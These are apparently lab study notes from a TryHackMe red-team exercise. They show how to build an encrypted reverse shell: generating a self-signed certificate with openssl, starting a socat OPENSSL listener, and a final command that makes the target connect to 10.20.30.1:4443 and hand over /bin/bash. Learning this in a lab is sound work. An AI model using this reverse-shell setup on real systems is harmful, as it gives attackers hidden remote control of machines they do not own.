1. Create a key:
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.
req indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing.
-x509 specifies that we want an X.509 certificate
-newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size, such as -newkey rsa:2048.)
-days 365 shows that the validity of our certificate will be one year
-subj sets data, such as organization and country, via the command-line.
-nodes simplifies our command and does not encrypt the private key
-keyout PRIVATE_KEY specifies the filename where we want to save our private key
-out CERTIFICATE specifies the filename to which we want to write the certificate request

Private key: thm-reverse.key
Certificate: thm-reverse.crt


We need a .pem file, for that cat the 2 file 
cat thm-reverse.key thm-reverse.crt > thm-reverse.pem 

2.  Now we start a socat listener 
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT

-d -d provides some debugging data (fatal, error, warning, and notice messages)
OPENSSL-LISTEN:PORT_NUM indicates that the connection will be encrypted using OPENSSL
cert=PEM_FILE provides the PEM file (certificate and private key) to establish the encrypted connection
verify=0 disables checking peer’s certificate
fork creates a sub-process to handle each new connection.


3. On the target rn this
socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash


